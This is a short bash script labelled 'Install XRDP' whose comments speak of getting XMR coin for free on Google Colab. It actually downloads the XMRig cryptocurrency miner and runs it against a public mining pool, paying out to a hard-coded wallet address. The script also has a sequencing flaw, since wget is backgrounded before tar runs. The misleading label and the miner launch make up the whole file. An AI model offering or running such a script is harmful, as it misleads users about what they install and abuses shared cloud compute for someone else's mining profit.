#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr

wget 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz' & tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 8BRRbPa85QU6dmQH3e7HyFg6NSPQvEGyv7JeL5xbvP4ZeKQAP6AWZV9MWXAUd3SBQodqeHhh6cVRR9WuktaxcZnn8w2wX3S -k --tls --rig-id GC-US
